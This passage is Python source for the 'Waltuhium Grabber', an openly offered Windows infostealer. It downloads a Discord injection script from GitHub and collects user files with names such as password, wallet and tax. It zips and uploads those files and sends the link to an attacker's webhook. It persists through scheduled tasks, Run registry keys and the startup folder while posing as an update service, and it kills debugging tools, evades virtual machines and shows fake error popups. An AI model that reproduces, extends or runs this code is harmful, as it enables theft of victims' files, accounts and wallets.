                async with session.get("https://raw.githubusercontent.com/justforExela/injection/main/injection.js") as response:
                    data = await response.text()
                    return data.replace("%WEBHOOK%", webhook)
        except Exception as error:
            print(f"[-] An error occured while getting injection code, error code => \"{error}\"")
            return None

    async def KillDiscord(self) -> None:
        try:
            proc = await asyncio.create_subprocess_shell("tasklist | findstr /i discord", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
            stdout, stderr = await proc.communicate()
            processes = stdout.decode(errors="ignore").split('\n')
            for proc in processes:
                if 'discord' in proc.lower():
                    try:
                        pid = int(proc.split()[1])
                        kill_proc = await asyncio.create_subprocess_shell(f"taskkill /F /PID {pid}", shell=True,stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                        await kill_proc.communicate()
                        self.already_killed = True
                    except:
                        pass
        except:
            pass

    async def FindIndexPath(self, path:str) -> str:
        try:
            for file in os.listdir(path):
                if re.search(r'app-+?', file):
                    modules_dir = os.path.join(path, file, "modules")
                    for modules_files in os.listdir(modules_dir):
                        if re.search(r'discord_desktop_core-+?', modules_files):
                            core_path = os.path.join(modules_dir, modules_files, "discord_desktop_core")
                            index_path = os.path.join(core_path, "index.js")
                            if os.path.isfile(index_path):
                                return index_path
        except:
            return None


class StealCommonFiles:
    def __init__(self) -> None:
        self.temp = os.getenv("temp")

    async def StealFiles(self) -> None:
        try:
            source_directories = (
                ("Desktop", os.path.join(os.getenv("userprofile"), "Desktop")),
                ("Desktop2", os.path.join(os.getenv("userprofile"), "OneDrive", "Desktop")),
                ("Pictures", os.path.join(os.getenv("userprofile"), "Pictures")),
                ("Documents", os.path.join(os.getenv("userprofile"), "Documents")),
                ("Music", os.path.join(os.getenv("userprofile"), "Music")),
                ("Videos", os.path.join(os.getenv("userprofile"), "Videos")),
                ("Downloads", os.path.join(os.getenv("userprofile"), "Downloads")),
            )

            destination_directory = os.path.join(self.temp, "StealedFilesByWaltuhium")

            if not os.path.exists(destination_directory):
                os.makedirs(destination_directory)

            keywords = ["secret", "password", "account", "tax", "key", "wallet", "backup"]
            allowed_extensions = [".txt", ".doc", ".docx", ".png", ".pdf", ".jpg", ".jpeg", ".csv", ".mp3", ".mp4", ".xls", ".xlsx", ".zip"]

            for _, source_path in source_directories:
                if os.path.isdir(source_path):
                    for folder_path, _, files in os.walk(source_path):
                        for file_name in files:
                            file_path = os.path.join(folder_path, file_name)

                            # Check if the file extension is allowed, if the size is less than 2 MB,
                            # and if any keyword is present in the file name
                            _, file_extension = os.path.splitext(file_name)
                            if (
                                file_extension.lower() in allowed_extensions
                                and os.path.getsize(file_path) < 2 * 1024 * 1024
                                or any(keyword in file_name.lower() for keyword in keywords)
                            ):
                                # Create a folder with the source folder name
                                source_folder_name = os.path.basename(os.path.normpath(folder_path))
                                destination_folder_path = os.path.join(destination_directory, source_folder_name)

                                if not os.path.exists(destination_folder_path):
                                    os.makedirs(destination_folder_path)

                                # Copy the file to the destination folder
                                destination_path = os.path.join(destination_folder_path, file_name)
                                shutil.copy2(file_path, destination_path)

            shutil.make_archive(destination_directory, 'zip', destination_directory)
            uploaded_url = await UploadGoFile.upload_file(destination_directory + ".zip")
            if not uploaded_url == None:
                async with aiohttp.ClientSession() as session:
                    embed_data2 = {
                            "title": "***Waltuhium Grabber***",
                            "description": f"***Grabbed Files***",
                            "url" : "https://t.me/waltuhium",
                            "color": 0,
                            "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuhium23/waltuhium"},
                            "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1192191430827970571/1196865524919975976/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313133383134313739313736363435383530392f313134373536383733383636353737393332322f494d475f393136312d72656d6f766562672d707265766965772e70.png"}}
                    fields2 = [{"name": "Download Link", "value": f"[Files.zip]({uploaded_url})", "inline": True}]
                    embed_data2["fields"] = fields2
                    payload2 = {
                                "username": "waltuhium | t.me/waltuhium",
                                "embeds": [embed_data2] }
                    async with session.post(webhook, json=payload2) as req:
                        pass
            try:
                os.remove(destination_directory + ".zip")
                shutil.rmtree(destination_directory)
            except:
                pass
        except:
            pass


class Startup:
    def __init__(self) -> None:
        self.LocalAppData = os.getenv("LOCALAPPDATA")
        self.RoamingAppData = os.getenv("APPDATA")
        self.CurrentFile = os.path.abspath(sys.argv[0])
        self.Privalage:bool = SubModules.IsAdmin()
        self.ToPath:str = os.path.join(self.LocalAppData, "WaltuhiumUpdateService", "Waltuhium.exe")
    async def main(self) -> None:
        await self.CreatePathAndMelt()
        print("[+] Started startup injection.")
        if startup_method == "schtasks":
            await self.SchtaskStartup()
        elif startup_method == "regedit":
            await self.RegeditStartup()
        elif startup_method == "folder":
            await self.FolderStartup()
        else:print("[-] unsupported or unkown startup method!")
        print(f"[+] Succesfully executed startup injection.")
    async def CreatePathAndMelt(self) -> None:
        try:
            if os.path.exists(self.ToPath): # if the startup file already exist, return
                return
            else:
                os.mkdir(self.ToPath.replace("Waltuhium.exe", "")) # Create Directory
                shutil.copyfile(self.CurrentFile, self.ToPath) # copy to current file to local appdata directory
                process = await asyncio.create_subprocess_shell(
                f'attrib +h +s "{self.ToPath}"',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate() # Melting file and give to system file privilages
        except Exception as e:
            print(str(e)) # print error if has error
    async def SchtaskStartup(self) -> None: # schtask method for startup
        try:
            command = await asyncio.create_subprocess_shell(
                'schtasks /query /TN "WaltuhiumUpdateService"',
                shell=True,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await command.communicate() # checking if the file on schtask or not
            if not stdout: # if the file not on schtasks
                if self.Privalage: # if the code running on admin privilage, execute the startup command
                    try:
                        onLogonCommand = f'schtasks /create /f /sc onlogon /rl highest /tn "WaltuhiumUpdateService" /tr "{self.ToPath}"'
                        everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /rl highest /tn "WaltuhiumUpdateService2" /tr "{self.ToPath}"'
                        process = await asyncio.create_subprocess_shell(onLogonCommand, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
                        await process.communicate()
                        process2 = await asyncio.create_subprocess_shell(everyOneHour, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
                        await process2.communicate()
                    except: # if the moduel cant load try to run the command
                        pass
                else: # if code not running on admin privilage, first get admin priv and then execute
                    result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                    if result > 32: # if the user give the admin req close the normal code for execute the admin priv code
                        os._exit(0)
                    else: # if the user not give the admin req
                        try:
                            command = f'schtasks /create /f /sc daily /ri 30 /tn "WaltuhiumUpdateService" /tr "{self.ToPath}"'
                            process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
                            await process.communicate()
                        except:
                            process = await asyncio.create_subprocess_shell(
                            f'schtasks /create /f /tn "WaltuhiumUpdateService" /tr "{self.ToPath}" /sc daily /ri 30',
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                            shell=True)
                            await process.communicate()
        except Exception as e:
            print(str(e)) # print error if has error
    async def RegeditStartup(self) -> None: # regedit method for startup
        try:
            if not self.Privalage: # if the code not running admin privilage, copy to HKCU
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Waltuhium Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
            else: # if the code running admin privilage, copy to HKLM
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Waltuhium Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
        except Exception as e:
            print(str(e))
    async def FolderStartup(self): # folder method for startup
        try:
            if self.Privalage: #if the code running admin privilage, copy to common startup path
                if os.path.isfile(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Waltuhium.exe"):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Waltuhium.exe")
            else: #if the code not running admin privilage, copy to normal startup path
                if os.path.isfile(os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Waltuhium.exe")):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Waltuhium.exe"))
        except Exception as e:
            print(str(e))


class AntiDebug:
    def __init__(self) -> None:
        self.banned_uuids = ["7AB5C494-39F5-4941-9163-47F54D6D5016","7204B444-B03C-48BA-A40F-0D1FE2E4A03B","88F1A492-340E-47C7-B017-AAB2D6F6976C","129B5E6B-E368-45D4-80AB-D4F106495924","8F384129-F079-456E-AE35-16608E317F4F","E6833342-780F-56A2-6F92-77DACC2EF8B3", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "71DC2242-6EA2-C40B-0798-B4F5B4CC8776", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-AC1F6BD04C9E", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
                            "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4"]
        self.banned_computer_names = ["WDAGUtilityAccount","Harry Johnson","JOANNA","WINZDS-21T43RNG", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
                            "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC",
                            "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R","COMPNAME_4491", "WILEYPC", "WORK","KATHLROGE","DESKTOP-TKGQ6GH", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC","DESKTOP-NNSJYNR", "JULIA-PC","DESKTOP-BQISITB", "d1bnJkfVlH"]
        self.banned_process = ["HTTP Toolkit.exe", "httpdebuggerui.exe","wireshark.exe", "fiddler.exe", "regedit.exe", "taskmgr.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe",
                                     "pestudio.exe", "vmwareuser.exe", "vgauthservice.exe", "vmacthlp.exe", "x96dbg.exe", "vmsrvc.exe", "x32dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe"]

    async def FunctionRunner(self):
        print("[+] Anti Debugging Started.")
        taskk = [asyncio.create_task(self.check_system()),
                 asyncio.create_task(self.kill_process())]
        await asyncio.gather(*taskk)
        print(f"[+] Anti Debug Succesfully Executed.")
    async def check_system(self) -> None:
        cmd = "wmic csproduct get uuid"
        process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
        stdout, stderr = await process.communicate()
        output_lines = stdout.decode(errors="ignore").split("\n")
        get_uuid = output_lines[1].strip()
        get_computer_name = os.getenv("computername")    
        
        for uuid in self.banned_uuids:
            if uuid in get_uuid:
                print("hwid detected")
                os._exit(0)
        
        for compName in self.banned_computer_names:
            if compName in get_computer_name:
                print("computer name detected")
                os._exit(0)

    async def kill_process(self) -> None:
        try:
            process_list = await asyncio.create_subprocess_shell(
                'tasklist',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            
            stdout, _ = await process_list.communicate()
            stdout = stdout.decode(errors="ignore")
            for proc in self.banned_process:
                if proc.lower() in stdout.lower():
                    process_list = await asyncio.create_subprocess_shell(
                    f'taskkill /F /IM "{proc}"',
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    shell=True)

                    await process_list.communicate()
        except:
            pass

class AntiVM:
    async def FunctionRunner(self) -> None:
        print("Anti-VM started.")
        taskk = [
            asyncio.create_task(self.CheckGpu()),
            asyncio.create_task(self.CheckHypervisor()),
            asyncio.create_task(self.CheckHostName()),
            asyncio.create_task(self.CheckDisk()),
            asyncio.create_task(self.CheckDLL()),
            asyncio.create_task(self.CheckGDB()),
            asyncio.create_task(self.CheckProcess()),]
        results = await asyncio.gather(*taskk)
        if any(results):
            print("Anti-VM executed sucesffuly, detected VM machines.")
            try:
                os._exit(0)
            except:
                try:
                    sys.exit(0)
                except:
                    try:
                        ctypes.windll.kernel32.ExitProcess(0)
                    except:
                        try:
                            exit(0)
                        except:
                            pass
        print("Anti-VM executed sucesffuly, do not detected VM machines.")
    async def CheckGpu(self) -> bool:
        try:
            command_output = await asyncio.create_subprocess_shell(
                'wmic path win32_VideoController get name',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
            stdout, stderr = await command_output.communicate()
            decoded_output = stdout.decode(errors='ignore').splitlines()
            return any(x.lower() in decoded_output[2].strip().lower() for x in ("virtualbox", "vmware"))
        except:
            return False
    async def CheckHostName(self) -> bool:
        try:
            hostNames = ['sandbox','cuckoo', 'vm', 'virtual', 'qemu', 'vbox', 'xen']
            hostname = platform.node().lower()
            for name in hostNames:
                if name in hostname:
                    return True
            return False
        except:
            return False
    async def CheckDisk(self) -> bool:
        try:
            return any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
        except:
            return False
    async def CheckDLL(self) -> bool:
        try:
            handle = ctypes.windll.LoadLibrary("SbieDll.dll")
        except:
            return False
        else:
            return True
    async def CheckGDB(self) -> bool:
        try:
            process = await asyncio.create_subprocess_shell(
                "gdb --version",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
            stdout, stderr = await process.communicate()
            if b"GDB" in stdout:
                return True
        except:
            return False
    async def CheckProcess(self) -> bool:
        try:
            banned_processes = [
            "vmtoolsd.exe",     # VMware
            "vmwaretray.exe",   # VMware
            "vmacthlp.exe",     # VMware
            "vboxtray.exe",     # VirtualBox
            "vboxservice.exe",  # VirtualBox
            "vmsrvc.exe",       # VirtualBox
            "prl_tools.exe",    # Parallels
            "xenservice.exe",   # Xen
                            ]           
            process = await asyncio.create_subprocess_shell("tasklist",stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
            stdout, stderr = await process.communicate()
            result = stdout.decode().lower()
            for process in banned_processes:
                if process in result:
                    return True
            return False
        except:
            return False
    async def CheckHypervisor(self) -> bool:
        try:
            output = await asyncio.create_subprocess_shell(
                'wmic computersystem get Manufacturer',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout, stderr = await output.communicate()

            output2 = await asyncio.create_subprocess_shell(
                'wmic path Win32_ComputerSystem get Manufacturer',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout2, stderr2 = await output2.communicate()

            
            if b'VMware' in stdout:
                return True
            elif b"vmware" in stdout2.lower():
                return True
        except:
            return False

async def Fakerror() -> None:
    try:
        if FakeError[0] and not os.path.abspath(sys.argv[0]) == os.path.join(os.getenv("LOCALAPPDATA"), "WaltuhiumUpdateService", "Waltuhium.exe"):
            title = FakeError[1][0].replace("\x22", "\\x22").replace("\x27", "\\x22") # Sets the title of the fake error
            message = FakeError[1][1].replace("\x22", "\\x22").replace("\x27", "\\x22") # Sets the message of the fake error
            cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, FakeError[1][2])
            await asyncio.create_subprocess_shell(cmd, shell=True) 
    except:pass

if __name__ == '__main__':
    if os.name == "nt":
        if not SubModules.create_mutex("Waltuhium | Grabber | on top |"):
            print("mutex already exist")
            os._exit(0)
        else:
            start_time = time.time()
            if Anti_VM:
                asyncio.run(AntiVM().FunctionRunner())
            asyncio.run(AntiDebug().FunctionRunner())
            if not startup_method == "no-startup":
                asyncio.run(Startup().main())
            asyncio.run(Fakerror())
            main_instance = Main()
            asyncio.run(main_instance.FunctionRunner())
            asyncio.run(DiscordInjection().InjectIntoToDiscord())
            if StealFiles == True:
                asyncio.run(StealCommonFiles().StealFiles())
            print(f"\nThe code executed on: {str(time.time() - start_time)} second", end="")
    else:
        print("just Windows Operating system's supported by Waltuhium")
